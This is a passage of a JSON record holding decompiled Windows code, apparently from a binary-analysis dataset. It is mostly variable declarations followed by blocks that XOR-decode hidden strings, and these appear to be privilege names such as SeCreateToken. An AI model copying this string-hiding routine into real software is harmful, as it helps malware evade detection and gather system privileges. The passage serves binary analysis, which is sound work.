        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004056c0(uint arg_8h)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint var_5a8h;\n    uint var_5a4h;\n    uint var_5a0h;\n    uint var_59ch;\n    uint var_598h;\n    uint var_594h;\n    uint var_590h;\n    uint var_58ch;\n    uint var_588h;\n    uint var_584h;\n    uint var_580h;\n    uint var_57ch;\n    uint var_578h;\n    uint var_574h;\n    uint var_570h;\n    uint var_56ch;\n    uint var_568h;\n    uint var_564h;\n    uint var_560h;\n    uint var_55ch;\n    uint var_558h;\n    uint var_554h;\n    uint var_550h;\n    uint var_54ch;\n    uint var_548h;\n    uint var_544h;\n    uint var_540h;\n    uint var_53ch;\n    uint var_538h;\n    uint var_534h;\n    uint var_530h;\n    uint var_52ch;\n    uint var_528h;\n    uint var_524h;\n    uint var_520h;\n    uint var_51ch;\n    uchar var_518h;\n    uchar var_517h;\n    uchar var_516h;\n    uchar var_515h;\n    uchar var_514h;\n    uchar var_513h;\n    uchar var_512h;\n    uchar var_511h;\n    uchar var_510h;\n    uchar var_50fh;\n    uchar var_50eh;\n    uchar var_50dh;\n    uchar var_50ch;\n    uchar var_50bh;\n    uchar var_50ah;\n    uchar var_509h;\n    uchar var_508h;\n    uchar var_507h;\n    uchar var_506h;\n    uchar var_505h;\n    uchar var_504h;\n    uchar var_503h;\n    uchar var_502h;\n    uchar var_501h;\n    uchar var_500h;\n    uchar var_4ffh;\n    uchar var_4feh;\n    uchar var_4fdh;\n    uint var_4fch;\n    uchar var_4f8h;\n    uchar var_4f7h;\n    uchar var_4f6h;\n    uchar var_4f5h;\n    uchar var_4f4h;\n    uchar var_4f3h;\n    uchar var_4f2h;\n    uchar var_4f1h;\n    uchar var_4f0h;\n    uchar var_4efh;\n    uchar var_4eeh;\n    uchar var_4edh;\n    uchar var_4ech;\n    uchar var_4ebh;\n    uchar var_4eah;\n    uchar var_4e9h;\n    uchar var_4e8h;\n    uchar var_4e7h;\n    uchar var_4e6h;\n    uchar var_4e5h;\n    uchar var_4e4h;\n    uchar var_4e3h;\n    uchar var_4e2h;\n    uchar var_4e1h;\n    uchar var_4e0h;\n    uchar var_4dfh;\n    uchar var_4deh;\n    uchar var_4ddh;\n    uint8_t var_4dch [4];\n    uchar var_4d8h;\n    uchar var_4d7h;\n    uchar var_4d6h;\n    uchar var_4d5h;\n    uchar var_4d4h;\n    uchar var_4d3h;\n    uchar var_4d2h;\n    uchar var_4d1h;\n    uchar var_4d0h;\n    uchar var_4cfh;\n    uchar var_4ceh;\n    uchar var_4cdh;\n    uchar var_4cch;\n    uchar var_4cbh;\n    uchar var_4cah;\n    uchar var_4c9h;\n    uchar var_4c8h;\n    uchar var_4c7h;\n    uchar var_4c6h;\n    uchar var_4c5h;\n    uchar var_4c4h;\n    uchar var_4c3h;\n    uchar var_4c2h;\n    uchar var_4c1h;\n    uchar var_4c0h;\n    uchar var_4bfh;\n    uchar var_4beh;\n    uchar var_4bdh;\n    uint8_t var_4bch [4];\n    uchar var_4b8h;\n    uchar var_4b7h;\n    uchar var_4b6h;\n    uchar var_4b5h;\n    uchar var_4b4h;\n    uchar var_4b3h;\n    uchar var_4b2h;\n    uchar var_4b1h;\n    uchar var_4b0h;\n    uchar var_4afh;\n    uchar var_4aeh;\n    uchar var_4adh;\n    uchar var_4ach;\n    uchar var_4abh;\n    uchar var_4aah;\n    uchar var_4a9h;\n    uchar var_4a8h;\n    uchar var_4a7h;\n    uchar var_4a6h;\n    uchar var_4a5h;\n    uchar var_4a4h;\n    uchar var_4a3h;\n    uchar var_4a2h;\n    uchar var_4a1h;\n    uchar var_4a0h;\n    uchar var_49fh;\n    uint var_49ch;\n    uchar var_498h;\n    uchar var_497h;\n    uchar var_496h;\n    uchar var_495h;\n    uchar var_494h;\n    uchar var_493h;\n    uchar var_492h;\n    uchar var_491h;\n    uchar var_490h;\n    uchar var_48fh;\n    uchar var_48eh;\n    uchar var_48dh;\n    uchar var_48ch;\n    uchar var_48bh;\n    uchar var_48ah;\n    uchar var_489h;\n    uchar var_488h;\n    uchar var_487h;\n    uchar var_486h;\n    uchar var_485h;\n    uchar var_484h;\n    uchar var_483h;\n    uchar var_482h;\n    uchar var_481h;\n    uchar var_480h;\n    uchar var_47fh;\n    uint var_47ch;\n    uchar var_478h;\n    uchar var_477h;\n    uchar var_476h;\n    uchar var_475h;\n    uchar var_474h;\n    uchar var_473h;\n    uchar var_472h;\n    uchar var_471h;\n    uchar var_470h;\n    uchar var_46fh;\n    uchar var_46eh;\n    uchar var_46dh;\n    uchar var_46ch;\n    uchar var_46bh;\n    uchar var_46ah;\n    uchar var_469h;\n    uchar var_468h;\n    uchar var_467h;\n    uchar var_466h;\n    uchar var_465h;\n    uchar var_464h;\n    uchar var_463h;\n    uchar var_462h;\n    uchar var_461h;\n    uchar var_460h;\n    uchar var_45fh;\n    uint8_t var_45ch [4];\n    uchar var_458h;\n    uchar var_457h;\n    uchar var_456h;\n    uchar var_455h;\n    uchar var_454h;\n    uchar var_453h;\n    uchar var_452h;\n    uchar var_451h;\n    uchar var_450h;\n    uchar var_44fh;\n    uchar var_44eh;\n    uchar var_44dh;\n    uchar var_44ch;\n    uchar var_44bh;\n    uchar var_44ah;\n    uchar var_449h;\n    uchar var_448h;\n    uchar var_447h;\n    uchar var_446h;\n    uchar var_445h;\n    uchar var_444h;\n    uchar var_443h;\n    uchar var_442h;\n    uchar var_441h;\n    uchar var_440h;\n    uint var_43ch;\n    uchar var_438h;\n    uchar var_437h;\n    uchar var_436h;\n    uchar var_435h;\n    uchar var_434h;\n    uchar var_433h;\n    uchar var_432h;\n    uchar var_431h;\n    uchar var_430h;\n    uchar var_42fh;\n    uchar var_42eh;\n    uchar var_42dh;\n    uchar var_42ch;\n    uchar var_42bh;\n    uchar var_42ah;\n    uchar var_429h;\n    uchar var_428h;\n    uchar var_427h;\n    uchar var_426h;\n    uchar var_425h;\n    uchar var_424h;\n    uchar var_423h;\n    uchar var_422h;\n    uchar var_421h;\n    uint8_t var_420h [4];\n    uchar var_41ch;\n    uchar var_41bh;\n    uchar var_41ah;\n    uchar var_419h;\n    uchar var_418h;\n    uchar var_417h;\n    uchar var_416h;\n    uchar var_415h;\n    uchar var_414h;\n    uchar var_413h;\n    uchar var_412h;\n    uchar var_411h;\n    uchar var_410h;\n    uchar var_40fh;\n    uchar var_40eh;\n    uchar var_40dh;\n    uchar var_40ch;\n    uchar var_40bh;\n    uchar var_40ah;\n    uchar var_409h;\n    uchar var_408h;\n    uchar var_407h;\n    uchar var_406h;\n    uchar var_405h;\n    uint var_404h;\n    uchar var_400h;\n    uchar var_3ffh;\n    uchar var_3feh;\n    uchar var_3fdh;\n    uchar var_3fch;\n    uchar var_3fbh;\n    uchar var_3fah;\n    uchar var_3f9h;\n    uchar var_3f8h;\n    uchar var_3f7h;\n    uchar var_3f6h;\n    uchar var_3f5h;\n    uchar var_3f4h;\n    uchar var_3f3h;\n    uchar var_3f2h;\n    uchar var_3f1h;\n    uchar var_3f0h;\n    uchar var_3efh;\n    uchar var_3eeh;\n    uchar var_3edh;\n    uchar var_3ech;\n    uchar var_3ebh;\n    uchar var_3eah;\n    uint var_3e8h;\n    uchar var_3e4h;\n    uchar var_3e3h;\n    uchar var_3e2h;\n    uchar var_3e1h;\n    uchar var_3e0h;\n    uchar var_3dfh;\n    uchar var_3deh;\n    uchar var_3ddh;\n    uchar var_3dch;\n    uchar var_3dbh;\n    uchar var_3dah;\n    uchar var_3d9h;\n    uchar var_3d8h;\n    uchar var_3d7h;\n    uchar var_3d6h;\n    uchar var_3d5h;\n    uchar var_3d4h;\n    uchar var_3d3h;\n    uchar var_3d2h;\n    uchar var_3d1h;\n    uchar var_3d0h;\n    uchar var_3cfh;\n    uint8_t var_3cch [4];\n    uchar var_3c8h;\n    uchar var_3c7h;\n    uchar var_3c6h;\n    uchar var_3c5h;\n    uchar var_3c4h;\n    uchar var_3c3h;\n    uchar var_3c2h;\n    uchar var_3c1h;\n    uchar var_3c0h;\n    uchar var_3bfh;\n    uchar var_3beh;\n    uchar var_3bdh;\n    uchar var_3bch;\n    uchar var_3bbh;\n    uchar var_3bah;\n    uchar var_3b9h;\n    uchar var_3b8h;\n    uchar var_3b7h;\n    uchar var_3b6h;\n    uchar var_3b5h;\n    uchar var_3b4h;\n    uchar var_3b3h;\n    uint8_t var_3b0h [4];\n    uchar var_3ach;\n    uchar var_3abh;\n    uchar var_3aah;\n    uchar var_3a9h;\n    uchar var_3a8h;\n    uchar var_3a7h;\n    uchar var_3a6h;\n    uchar var_3a5h;\n    uchar var_3a4h;\n    uchar var_3a3h;\n    uchar var_3a2h;\n    uchar var_3a1h;\n    uchar var_3a0h;\n    uchar var_39fh;\n    uchar var_39eh;\n    uchar var_39dh;\n    uchar var_39ch;\n    uchar var_39bh;\n    uchar var_39ah;\n    uchar var_399h;\n    uchar var_398h;\n    uchar var_397h;\n    uint var_394h;\n    uchar var_390h;\n    uchar var_38fh;\n    uchar var_38eh;\n    uchar var_38dh;\n    uchar var_38ch;\n    uchar var_38bh;\n    uchar var_38ah;\n    uchar var_389h;\n    uchar var_388h;\n    uchar var_387h;\n    uchar var_386h;\n    uchar var_385h;\n    uchar var_384h;\n    uchar var_383h;\n    uchar var_382h;\n    uchar var_381h;\n    uchar var_380h;\n    uchar var_37fh;\n    uchar var_37eh;\n    uchar var_37dh;\n    uchar var_37ch;\n    uint var_378h;\n    uchar var_374h;\n    uchar var_373h;\n    uchar var_372h;\n    uchar var_371h;\n    uchar var_370h;\n    uchar var_36fh;\n    uchar var_36eh;\n    uchar var_36dh;\n    uchar var_36ch;\n    uchar var_36bh;\n    uchar var_36ah;\n    uchar var_369h;\n    uchar var_368h;\n    uchar var_367h;\n    uchar var_366h;\n    uchar var_365h;\n    uchar var_364h;\n    uchar var_363h;\n    uchar var_362h;\n    uchar var_361h;\n    uchar var_360h;\n    uint var_35ch;\n    uchar var_358h;\n    uchar var_357h;\n    uchar var_356h;\n    uchar var_355h;\n    uchar var_354h;\n    uchar var_353h;\n    uchar var_352h;\n    uchar var_351h;\n    uchar var_350h;\n    uchar var_34fh;\n    uchar var_34eh;\n    uchar var_34dh;\n    uchar var_34ch;\n    uchar var_34bh;\n    uchar var_34ah;\n    uchar var_349h;\n    uchar var_348h;\n    uchar var_347h;\n    uchar var_346h;\n    uchar var_345h;\n    uchar var_344h;\n    uint var_340h;\n    uchar var_33ch;\n    uchar var_33bh;\n    uchar var_33ah;\n    uchar var_339h;\n    uchar var_338h;\n    uchar var_337h;\n    uchar var_336h;\n    uchar var_335h;\n    uchar var_334h;\n    uchar var_333h;\n    uchar var_332h;\n    uchar var_331h;\n    uchar var_330h;\n    uchar var_32fh;\n    uchar var_32eh;\n    uchar var_32dh;\n    uchar var_32ch;\n    uchar var_32bh;\n    uchar var_32ah;\n    uchar var_329h;\n    uint8_t var_328h [4];\n    uchar var_324h;\n    uchar var_323h;\n    uchar var_322h;\n    uchar var_321h;\n    uchar var_320h;\n    uchar var_31fh;\n    uchar var_31eh;\n    uchar var_31dh;\n    uchar var_31ch;\n    uchar var_31bh;\n    uchar var_31ah;\n    uchar var_319h;\n    uchar var_318h;\n    uchar var_317h;\n    uchar var_316h;\n    uchar var_315h;\n    uchar var_314h;\n    uchar var_313h;\n    uchar var_312h;\n    uchar var_311h;\n    uint8_t var_310h [4];\n    uchar var_30ch;\n    uchar var_30bh;\n    uchar var_30ah;\n    uchar var_309h;\n    uchar var_308h;\n    uchar var_307h;\n    uchar var_306h;\n    uchar var_305h;\n    uchar var_304h;\n    uchar var_303h;\n    uchar var_302h;\n    uchar var_301h;\n    uchar var_300h;\n    uchar var_2ffh;\n    uchar var_2feh;\n    uchar var_2fdh;\n    uchar var_2fch;\n    uchar var_2fbh;\n    uchar var_2fah;\n    uchar var_2f9h;\n    uint var_2f8h;\n    uchar var_2f4h;\n    uchar var_2f3h;\n    uchar var_2f2h;\n    uchar var_2f1h;\n    uchar var_2f0h;\n    uchar var_2efh;\n    uchar var_2eeh;\n    uchar var_2edh;\n    uchar var_2ech;\n    uchar var_2ebh;\n    uchar var_2eah;\n    uchar var_2e9h;\n    uchar var_2e8h;\n    uchar var_2e7h;\n    uchar var_2e6h;\n    uchar var_2e5h;\n    uchar var_2e4h;\n    uchar var_2e3h;\n    uchar var_2e2h;\n    uint8_t var_2e0h [4];\n    uchar var_2dch;\n    uchar var_2dbh;\n    uchar var_2dah;\n    uchar var_2d9h;\n    uchar var_2d8h;\n    uchar var_2d7h;\n    uchar var_2d6h;\n    uchar var_2d5h;\n    uchar var_2d4h;\n    uchar var_2d3h;\n    uchar var_2d2h;\n    uchar var_2d1h;\n    uchar var_2d0h;\n    uchar var_2cfh;\n    uchar var_2ceh;\n    uchar var_2cdh;\n    uchar var_2cch;\n    uchar var_2cbh;\n    uchar var_2cah;\n    uint var_2c8h;\n    uchar var_2c4h;\n    uchar var_2c3h;\n    uchar var_2c2h;\n    uchar var_2c1h;\n    uchar var_2c0h;\n    uchar var_2bfh;\n    uchar var_2beh;\n    uchar var_2bdh;\n    uchar var_2bch;\n    uchar var_2bbh;\n    uchar var_2bah;\n    uchar var_2b9h;\n    uchar var_2b8h;\n    uchar var_2b7h;\n    uchar var_2b6h;\n    uchar var_2b5h;\n    uchar var_2b4h;\n    uchar var_2b3h;\n    uint8_t var_2b0h [4];\n    uchar var_2ach;\n    uchar var_2abh;\n    uchar var_2aah;\n    uchar var_2a9h;\n    uchar var_2a8h;\n    uchar var_2a7h;\n    uchar var_2a6h;\n    uchar var_2a5h;\n    uchar var_2a4h;\n    uchar var_2a3h;\n    uchar var_2a2h;\n    uchar var_2a1h;\n    uchar var_2a0h;\n    uchar var_29fh;\n    uchar var_29eh;\n    uchar var_29dh;\n    uchar var_29ch;\n    uchar var_29bh;\n    uint8_t var_298h [4];\n    uchar var_294h;\n    uchar var_293h;\n    uchar var_292h;\n    uchar var_291h;\n    uchar var_290h;\n    uchar var_28fh;\n    uchar var_28eh;\n    uchar var_28dh;\n    uchar var_28ch;\n    uchar var_28bh;\n    uchar var_28ah;\n    uchar var_289h;\n    uchar var_288h;\n    uchar var_287h;\n    uchar var_286h;\n    uchar var_285h;\n    uchar var_284h;\n    uchar var_283h;\n    uint8_t var_280h [4];\n    uchar var_27ch;\n    uchar var_27bh;\n    uchar var_27ah;\n    uchar var_279h;\n    uchar var_278h;\n    uchar var_277h;\n    uchar var_276h;\n    uchar var_275h;\n    uchar var_274h;\n    uchar var_273h;\n    uchar var_272h;\n    uchar var_271h;\n    uchar var_270h;\n    uchar var_26fh;\n    uchar var_26eh;\n    uchar var_26dh;\n    uchar var_26ch;\n    uint var_268h;\n    uchar var_264h;\n    uchar var_263h;\n    uchar var_262h;\n    uchar var_261h;\n    uchar var_260h;\n    uchar var_25fh;\n    uchar var_25eh;\n    uchar var_25dh;\n    uchar var_25ch;\n    uchar var_25bh;\n    uchar var_25ah;\n    uchar var_259h;\n    uchar var_258h;\n    uchar var_257h;\n    uchar var_256h;\n    uchar var_255h;\n    uint var_254h;\n    uchar var_250h;\n    uchar var_24fh;\n    uchar var_24eh;\n    uchar var_24dh;\n    uchar var_24ch;\n    uchar var_24bh;\n    uchar var_24ah;\n    uchar var_249h;\n    uchar var_248h;\n    uchar var_247h;\n    uchar var_246h;\n    uchar var_245h;\n    uchar var_244h;\n    uchar var_243h;\n    uchar var_242h;\n    uchar var_241h;\n    uint8_t var_240h [4];\n    uchar var_23ch;\n    uchar var_23bh;\n    uchar var_23ah;\n    uchar var_239h;\n    uchar var_238h;\n    uchar var_237h;\n    uchar var_236h;\n    uchar var_235h;\n    uchar var_234h;\n    uchar var_233h;\n    uchar var_232h;\n    uchar var_231h;\n    uchar var_230h;\n    uchar var_22fh;\n    uchar var_22eh;\n    uchar var_22dh;\n    uint var_22ch;\n    uchar var_228h;\n    uchar var_227h;\n    uchar var_226h;\n    uchar var_225h;\n    uchar var_224h;\n    uchar var_223h;\n    uchar var_222h;\n    uchar var_221h;\n    uchar var_220h;\n    uchar var_21fh;\n    uchar var_21eh;\n    uchar var_21dh;\n    uchar var_21ch;\n    uchar var_21bh;\n    uchar var_21ah;\n    uint8_t var_218h [4];\n    uchar var_214h;\n    uchar var_213h;\n    uchar var_212h;\n    uchar var_211h;\n    uchar var_210h;\n    uchar var_20fh;\n    uchar var_20eh;\n    uchar var_20dh;\n    uchar var_20ch;\n    uchar var_20bh;\n    uchar var_20ah;\n    uchar var_209h;\n    uchar var_208h;\n    uchar var_207h;\n    uchar var_206h;\n    uint var_204h;\n    uchar var_200h;\n    uchar var_1ffh;\n    uchar var_1feh;\n    uchar var_1fdh;\n    uchar var_1fch;\n    uchar var_1fbh;\n    uchar var_1fah;\n    uchar var_1f9h;\n    uchar var_1f8h;\n    uchar var_1f7h;\n    uchar var_1f6h;\n    uchar var_1f5h;\n    uchar var_1f4h;\n    uchar var_1f3h;\n    uint8_t var_1f0h [4];\n    uchar var_1ech;\n    uchar var_1ebh;\n    uchar var_1eah;\n    uchar var_1e9h;\n    uchar var_1e8h;\n    uchar var_1e7h;\n    uchar var_1e6h;\n    uchar var_1e5h;\n    uchar var_1e4h;\n    uchar var_1e3h;\n    uchar var_1e2h;\n    uchar var_1e1h;\n    uchar var_1e0h;\n    uchar var_1dfh;\n    uint var_1dch;\n    uchar var_1d8h;\n    uchar var_1d7h;\n    uchar var_1d6h;\n    uchar var_1d5h;\n    uchar var_1d4h;\n    uchar var_1d3h;\n    uchar var_1d2h;\n    uchar var_1d1h;\n    uchar var_1d0h;\n    uchar var_1cfh;\n    uchar var_1ceh;\n    uchar var_1cdh;\n    uchar var_1cch;\n    uint var_1c8h;\n    uchar var_1c4h;\n    uchar var_1c3h;\n    uchar var_1c2h;\n    uchar var_1c1h;\n    uchar var_1c0h;\n    uchar var_1bfh;\n    uchar var_1beh;\n    uchar var_1bdh;\n    uchar var_1bch;\n    uchar var_1bbh;\n    uchar var_1bah;\n    uchar var_1b9h;\n    uchar var_1b8h;\n    uint var_1b4h;\n    uchar var_1b0h;\n    uchar var_1afh;\n    uchar var_1aeh;\n    uchar var_1adh;\n    uchar var_1ach;\n    uchar var_1abh;\n    uchar var_1aah;\n    uchar var_1a9h;\n    uchar var_1a8h;\n    uchar var_1a7h;\n    uchar var_1a6h;\n    uint8_t var_1a4h [4];\n    uchar var_1a0h;\n    uchar var_19fh;\n    uint var_19ch;\n    uchar var_198h;\n    uchar var_197h;\n    uint var_194h;\n    uchar var_190h;\n    uchar var_18fh;\n    uint var_18ch;\n    uchar var_188h;\n    uchar var_187h;\n    uint var_184h;\n    uchar var_180h;\n    uchar var_17fh;\n    uint var_17ch;\n    uchar var_178h;\n    uchar var_177h;\n    uint var_174h;\n    uchar var_170h;\n    uchar var_16fh;\n    uint var_16ch;\n    uchar var_168h;\n    uchar var_167h;\n    uint var_164h;\n    uchar var_160h;\n    uchar var_15fh;\n    uint var_15ch;\n    uchar var_158h;\n    uchar var_157h;\n    uint var_154h;\n    uchar var_150h;\n    uchar var_14fh;\n    uint var_14ch;\n    uchar var_148h;\n    uchar var_147h;\n    uint var_144h;\n    uchar var_140h;\n    uchar var_13fh;\n    uint var_13ch;\n    uchar var_138h;\n    uchar var_137h;\n    uint var_134h;\n    uchar var_130h;\n    uchar var_12fh;\n    uint var_12ch;\n    uchar var_128h;\n    uchar var_127h;\n    uint var_124h;\n    uchar var_120h;\n    uchar var_11fh;\n    uint var_11ch;\n    uchar var_118h;\n    uchar var_117h;\n    uint var_114h;\n    uchar var_110h;\n    uchar var_10fh;\n    uint var_10ch;\n    uchar var_108h;\n    uchar var_107h;\n    uint8_t var_104h [4];\n    uchar var_100h;\n    uchar var_ffh;\n    uint8_t var_fch [4];\n    uchar var_f8h;\n    uint var_f4h;\n    uchar var_f0h;\n    uint var_ech;\n    uchar var_e8h;\n    uint var_e4h;\n    uchar var_e0h;\n    uint var_dch;\n    uchar var_d8h;\n    uint var_d4h;\n    uchar var_d0h;\n    uint var_cch;\n    uchar var_c8h;\n    uint var_c4h;\n    uchar var_c0h;\n    uint var_bch;\n    uchar var_b8h;\n    uint var_b4h;\n    uchar var_b0h;\n    uint var_ach;\n    uchar var_a8h;\n    uint var_a4h;\n    uchar var_a0h;\n    uint var_9ch;\n    uchar var_98h;\n    uint var_94h;\n    uchar var_90h;\n    int32_t var_8ch;\n    int32_t var_88h;\n    int32_t var_84h;\n    int32_t var_80h;\n    int32_t var_7ch;\n    int32_t var_78h;\n    int32_t var_74h;\n    int32_t var_70h;\n    int32_t var_6ch;\n    int32_t var_68h;\n    int32_t var_64h;\n    int32_t var_60h;\n    int32_t var_5ch;\n    int32_t var_58h;\n    int32_t var_54h;\n    int32_t var_50h;\n    int32_t var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    int32_t var_3ch;\n    int32_t var_38h;\n    int32_t var_34h;\n    int32_t var_30h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_2f8h._0_1_ = 0x3d;\n    var_2f8h._1_1_ = 0x21;\n    var_2f8h._2_1_ = 0x15;\n    var_2f8h._3_1_ = 0x21;\n    var_2f4h = 1;\n    var_2f3h = 0x24;\n    var_2f2h = 0x1a;\n    var_2f1h = 0x21;\n    var_2f0h = 2;\n    var_2efh = 0x3c;\n    var_2eeh = 0xf;\n    var_2edh = 0x20;\n    var_2ech = 0;\n    var_2ebh = 0x14;\n    var_2eah = 0x24;\n    var_2e9h = 0x3a;\n    var_2e8h = 0x12;\n    var_2e7h = 0x2c;\n    var_2e6h = 2;\n    var_2e5h = 0x21;\n    var_2e4h = 0x31;\n    var_2e3h = 0x36;\n    var_2e2h = 100;\n    var_10ch._0_1_ = 0x6e;\n    var_10ch._1_1_ = 0x44;\n    var_10ch._2_1_ = 0x56;\n    var_10ch._3_1_ = 0x53;\n    var_108h = 100;\n    var_107h = 0x45;\n    fcn.004012a0(0x17);\n    for (var_4h = 0; var_4h < 0x17; var_4h = var_4h + 1) {\n        fcn.00401280(var_4h, *(&var_2f8h + var_4h) ^ *(&var_10ch + var_4h % 6));\n    }\n    uVar2 = arg_8h;\n    uVar1 = fcn.00401270();\n    fcn.00424640(uVar1, uVar2);\n    var_47ch._0_1_ = 0x37;\n    var_47ch._1_1_ = 0x28;\n    var_47ch._2_1_ = 0x74;\n    var_47ch._3_1_ = 0x32;\n    var_478h = 0x45;\n    var_477h = 0xd;\n    var_476h = 0x2a;\n    var_475h = 0x5b;\n    var_474h = 0x11;\n    var_473h = 0x44;\n    var_472h = 0xd;\n    var_471h = 0x20;\n    var_470h = 0x54;\n    var_46fh = 0x33;\n    var_46eh = 0x4f;\n    var_46dh = 0x30;\n    var_46ch = 0x22;\n    var_46bh = 0x5e;\n    var_46ah = 0x24;\n    var_469h = 0x58;\n    var_468h = 0x34;\n    var_467h = 0x3f;\n    var_466h = 0x5c;\n    var_465h = 0x37;\n    var_464h = 0x5f;\n    var_463h = 8;\n    var_462h = 0x28;\n    var_461h = 0x52;\n    var_460h = 0x24;\n    var_45fh = 0x36;\n    var_b4h._0_1_ = 100;\n    var_b4h._1_1_ = 0x4d;\n    var_b4h._2_1_ = 0x35;\n    var_b4h._3_1_ = 0x41;\n    var_b0h = 0x36;\n    fcn.004012a0(0x1e);\n    for (var_8h = 0; var_8h < 0x1e; var_8h = var_8h + 1) {\n        fcn.00401280(var_8h, *(&var_47ch + var_8h) ^ *(&var_b4h + var_8h % 5));\n    }\n    uVar2 = arg_8h;\n    uVar1 = fcn.00401270();\n    fcn.00424640(uVar1, uVar2);\n    var_2c8h._0_1_ = 0x1a;\n    var_2c8h._1_1_ = 1;\n    var_2c8h._2_1_ = 0x19;\n    var_2c8h._3_1_ = 0x1e;\n    var_2c4h = 0x11;\n    var_2c3h = 0x1d;\n    var_2c2h = 4;\n    var_2c1h = 1;\n    var_2c0h = 0x38;\n    var_2bfh = 0x1e;\n    var_2beh = 0;\n    var_2bdh = 0xf;\n    var_2bch = 0x19;\n    var_2bbh = 0x16;\n    var_2bah = 0x3c;\n    var_2b9h = 7;\n    var_2b8h = 0x1b;\n    var_2b7h = 0x1a;\n    var_2b6h = 0x2c;\n    var_2b5h = 3;\n    var_2b4h = 0x30;\n    var_2b3h = 0x71;\n    var_114h._0_1_ = 0x49;\n    var_114h._1_1_ = 100;\n    var_114h._2_1_ = 0x55;\n    var_114h._3_1_ = 0x71;\n    var_110h = 0x72;\n    var_10fh = 0x76;\n    fcn.004012a0(0x16);\n    for (var_ch = 0; var_ch < 0x16; var_ch = var_ch + 1) {\n        fcn.00401280(var_ch, *(&var_2c8h + var_ch) ^ *(&var_114h + var_ch % 6));\n    }\n    uVar2 = arg_8h;\n    uVar1 = fcn.00401270();\n    fcn.00424640(uVar1, uVar2);\n    var_394h._0_1_ = 0x3e;\n    var_394h._1_1_ = 0x1d;\n    var_394h._2_1_ = 0xc;\n    var_394h._3_1_ = 0x27;\n    var_390h = 0xd;\n    var_38fh = 0x10;\n    var_38eh = 8;\n    var_38dh = 0x19;\n    var_38ch = 0x36;\n    var_38bh = 0x2c;\n    var_38ah = 0x3f;\n    var_389h = 0x17;\n    var_388h = 2;\n    var_387h = 0xc;\n    var_386h = 0x24;\n    var_385h = 0x19;\n    var_384h = 0x1c;\n    var_383h = 0xb;\n    var_382h = 0x1b;\n    var_381h = 0x11;\n    var_380h = 0x29;\n    var_37fh = 0x2c;\n    var_37eh = 9;\n    var_37dh = 7;\n    var_37ch = 0x6d;\n    var_11ch._0_1_ = 0x6d;\n    var_11ch._1_1_ = 0x78;\n    var_11ch._2_1_ = 0x45;\n    var_11ch._3_1_ = 0x49;\n    var_118h = 0x6e;\n    var_117h = 0x62;\n    fcn.004012a0(0x19);\n    for (var_10h = 0; var_10h < 0x19; var_10h = var_10h + 1) {\n        fcn.00401280(var_10h, *(&var_394h + var_10h) ^ *(&var_11ch + var_10h % 6));\n    }\n    uVar2 = arg_8h;\n    uVar1 = fcn.00401270();\n    fcn.00424640(uVar1, uVar2);\n    var_43ch._0_1_ = 0x16;\n    var_43ch._1_1_ = 0x27;\n    var_43ch._2_1_ = 0xf;\n    var_43ch._3_1_ = 0xd;\n    var_438h = 0x37;\n    var_437h = 0x1d;\n    var_436h = 0x29;\n    var_435h = 0x2b;\n    var_434h = 0x39;\n    var_433h = 10;\n    var_432h = 0x30;\n    var_431h = 0x17;\n    var_430h = 0x21;\n    var_42fh = 0xb;\n    var_42eh = 0x34;\n    var_42dh = 0x13;\n    var_42ch = 0x31;\n    var_42bh = 6;\n    var_42ah = 0x15;\n    var_429h = 0x30;\n    var_428h = 0x33;\n    var_427h = 0x15;\n    var_426h = 0x2d;\n    var_425h = 0x1e;\n    var_424h = 0x20;\n    var_423h = 0x25;\n    var_422h = 0x3f;\n    var_421h = 99;\n    var_104h[0] = 0x45;\n    var_104h[1] = 0x42;\n    var_104h[2] = 0x5a;\n    var_104h[3] = 99;\n    var_100h = 0x44;\n    var_ffh = 0x72;\n    fcn.004012a0(0x1c);\n    for (var_14h = 0; var_14h < 0x1c; var_14h = var_14h + 1) {\n        fcn.00401280(var_14h, *(&var_43ch + var_14h) ^ var_104h[var_14h % 6]);\n    }\n    uVar2 = arg_8h;\n    uVar1 = fcn.00401270();\n    fcn.00424640(uVar1, uVar2);\n    var_3e8h._0_1_ = 0x61;\n    var_3e8h._1_1_ = 0x57;\n    var_3e8h._2_1_ = 0x2b;\n    var_3e8h._3_1_ = 0x10;\n    var_3e4h = 0x13;\n    var_3e3h = 0x5a;\n    var_3e2h = 0x5b;\n    var_3e1h = 8;\n    var_3e0h = 0x14;\n    var_3dfh = 0x31;\n    var_3deh = 0x51;\n    var_3ddh = 0x51;\n    var_3dch = 9;\n    var_3dbh = 4;\n    var_3dah = 0x1e;\n    var_3d9h = 0x46;\n    var_3d8h = 0x62;\n    var_3d7h = 0x14;\n    var_3d6h = 0x18;\n    var_3d5h = 6;\n    var_3d4h = 0x5b;\n    var_3d3h = 0x5e;\n    var_3d2h = 3;\n    var_3d1h = 0x16;\n    var_3d0h = 0x15;\n    var_3cfh = 0x32;\n    var_cch._0_1_ = 0x32;\n    var_cch._1_1_ = 0x32;\n    var_cch._2_1_ = 0x66;\n    var_cch._3_1_ = 0x71;\n    var_c8h = 0x70;\n    fcn.004012a0(0x1a);\n    for (var_18h = 0; var_18h < 0x1a; var_18h = var_18h + 1) {\n        fcn.00401280(var_18h, *(&var_3e8h + var_18h) ^ *(&var_cch + var_18h % 5));\n    }\n    uVar2 = arg_8h;\n    uVar1 = fcn.00401270();\n    fcn.00424640(uVar1, uVar2);\n    var_1b4h._0_1_ = 5;\n    var_1b4h._1_1_ = 2;\n    var_1b4h._2_1_ = 0x1a;\n    var_1b4h._3_1_ = 2;\n    var_1b0h = 0x2c;\n    var_1afh = 6;\n    var_1aeh = 0x15;\n    var_1adh = 0x27;\n    var_1ach = 0x17;\n    var_1abh = 0x27;\n    var_1aah = 0x3a;\n    var_1a9h = 2;\n    var_1a8h = 0x29;\n    var_1a7h = 4;\n    var_1a6h = 0x4e;\n    var_c4h._0_1_ = 0x56;\n    var_c4h._1_1_ = 0x67;\n    var_c4h._2_1_ = 0x4e;\n    var_c4h._3_1_ = 0x61;\n    var_c0h = 0x4e;\n    fcn.004012a0(0xf);\n    for (var_1ch = 0; var_1ch < 0xf; var_1ch = var_1ch + 1) {\n        fcn.00401280(var_1ch, *(&var_1b4h + 